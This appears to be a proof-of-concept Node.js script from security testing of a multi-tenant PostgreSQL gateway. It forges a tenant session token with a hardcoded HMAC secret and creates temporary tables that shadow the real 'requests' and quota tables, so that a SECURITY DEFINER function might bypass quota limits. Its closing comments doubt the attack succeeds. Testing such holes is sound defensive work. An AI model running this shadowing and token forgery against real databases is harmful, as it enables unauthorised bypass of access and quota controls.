const { Pool } = require('pg');
const pool = new Pool({ user: 'u0_a338', host: '127.0.0.1', database: 'postgres', port: 5432 });

async function run() {
    const client = await pool.connect();
    try {
        await client.query("SET ROLE gateway_role");
        
        // Setup authenticated session
        const crypto = require('crypto');
        const sig = crypto.createHmac('sha256', 'stage2-secret-key-12345').update('00000000-0000-0000-0000-000000000002').digest('hex');
        await client.query(`SET app.tenant_token = '00000000-0000-0000-0000-000000000002.${sig}'`);
        
        // Create temp requests and quotas tables
        await client.query("CREATE TEMP TABLE requests (id UUID, tenant_id UUID, target_tool TEXT, idempotency_key TEXT, request_fingerprint TEXT, payload JSONB, state TEXT)");
        await client.query("CREATE TEMP TABLE global_quota (id INT, max_pending INT, pending_count INT)");
        await client.query("CREATE TEMP TABLE quotas (tenant_id UUID, max_pending INT, pending_count INT)");
        
        // Insert fake quotas
        await client.query("INSERT INTO global_quota VALUES (1, 999, 0)");
        await client.query("INSERT INTO quotas VALUES ('00000000-0000-0000-0000-000000000002', 999, 0)");
        
        const res = await client.query("SELECT reserve_request('toolA', 'k', 'hash', '{}')");
        console.log("Hijacked Reserve Request:", res.rows[0].reserve_request);
        
        // Now check if it actually inserted into the real DB. 
        // Wait, the SECURITY DEFINER function will insert into the TEMP table!
        // But if it inserts into the TEMP table, it bypasses the real quotas!
        // So the attacker effectively bypasses global quotas and writes to a temp table, but wait, if it's a temp table, the real requests table won't get it! So this is just a DoS against themselves?
        
    } catch(e) {
        console.log("Error:", e.message);
    } finally {
        client.release();
        pool.end();
    }
}
run();
